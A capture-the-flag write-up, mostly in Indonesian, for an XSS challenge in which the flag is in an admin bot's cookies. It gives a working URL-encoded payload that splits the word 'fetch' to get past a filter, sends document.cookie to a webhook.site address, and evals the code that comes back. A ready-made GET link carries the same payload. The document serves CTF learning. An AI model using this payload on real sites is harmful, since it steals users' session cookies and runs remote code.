# Challenge Name: No Fetch?!?!

![Category: Website](https://img.shields.io/badge/Category-challenge-lightgrey.svg)
![Point: 20](https://img.shields.io/badge/Score-20-brightgreen.svg)

## Description

The easest XSS ever! But wait... no fetch? Visit the challenge at http://ao.bliu.tech:9090.

The admin bot for this challenge is at https://admin-bot.acmcyber.com/no-fetch. The flag is in the admin bot's cookies.

## Attached Files

\-

## Solution

disini website tersebut dijelaskan di deskripsi adalah XSS, kita harus mendapatkan cookie tersebut dengan fetch tapi kita tidak boleh memakai fetch

![image1](https://cdn.discordapp.com/attachments/1080821742722883684/1080830828180934757/Screen_Shot_2023-03-02_at_19.35.36.png)

kita melakukan bypass fetch dengan payload

```
<img+src%3D"x"+onerror%3D"top%5B%60fet%60%2B%60ch%60%5D%28%27https%3A%2F%2Fwebhook.site%2F7efc8b25-6507-43e7-a16a-54236fb0bd58%3Fcookie%3D%27%2Bdocument.cookie%2C+%7Bcredentials%3A+%27include%27%7D%29.then%28response+%3D>response.text%28%29%29.then%28%28body%29+%3D>%7Btop%5B%60ev%60%2B%60al%60%5D%28body%29%3B%7D%29">%0D%0A
```

ternyata website tersebut dengan request POST di website bot mintanya id Post teresbut, setelah di bantu oleh mas [Dimas](https://github.com/dimasma0305).
bisa mengguakan request GET

```
http://ao.bliu.tech:9090/post?content=%3Cimg+src%3D%22x%22+onerror%3D%22top%5B%60fet%60%2B%60ch%60%5D%28%27https%3A%2F%2Fwebhook.site%2F7efc8b25-6507-43e7-a16a-54236fb0bd58%3Fcookie%3D%27%2Bdocument.cookie%2C+%7Bcredentials%3A+%27include%27%7D%29.then%28response+%3D%3Eresponse.text%28%29%29.then%28%28body%29+%3D%3E%7Btop%5B%60ev%60%2B%60al%60%5D%28body%29%3B%7D%29%22%3E%0D%0A
```

setelah dikirim di web botnya akan mendapatkan flag tersebut

![image2](https://cdn.discordapp.com/attachments/1080821742722883684/1080833122200993823/Screen_Shot_2023-03-02_at_19.44.36.png)

---

[Back to home](/2023/After%20Dark%20Winter/)
